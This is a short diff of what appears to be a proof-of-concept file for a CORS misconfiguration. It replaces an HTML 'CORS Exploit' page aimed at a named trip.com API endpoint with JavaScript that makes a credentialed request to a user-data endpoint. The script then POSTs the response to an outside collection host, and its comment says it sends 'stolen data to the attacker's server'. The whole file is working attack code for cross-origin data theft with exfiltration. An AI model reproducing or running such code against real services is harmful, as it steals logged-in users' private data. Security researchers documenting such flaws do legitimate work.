@@ -1,23 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>CORS Exploit</title>
-</head>
-<body>
-    <script>
-        function exploit() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://www.trip.com/restapi/soa2/18073/json/queryPartnerProfileDetails', true);
-            xhr.withCredentials = true; // Include credentials
-            xhr.onload = function() {
-                if (xhr.status == 200) {
-                    alert(xhr.responseText); // This alert would show the sensitive data
-                }
-            };
-            xhr.setRequestHeader('Origin', 'http://localhost');
-            xhr.send();
-        }
-    </script>
-    <button onclick="exploit()">Exploit CORS</button>
-</body>
-</html>
+fetch("https://www.site.com/api/userdata", {
+  method: "GET",
+  credentials: "include",
+  headers: {
+    Origin: "http://mytrainpal.com:666"
+  }
+})
+  .then(response => response.text())
+  .then(data => {
+    // Send stolen data to the attacker's server
+    fetch("https://69r3ljqp.c5.rs/leak", {
+      method: "POST",
+      body: data,
+    });
+  });
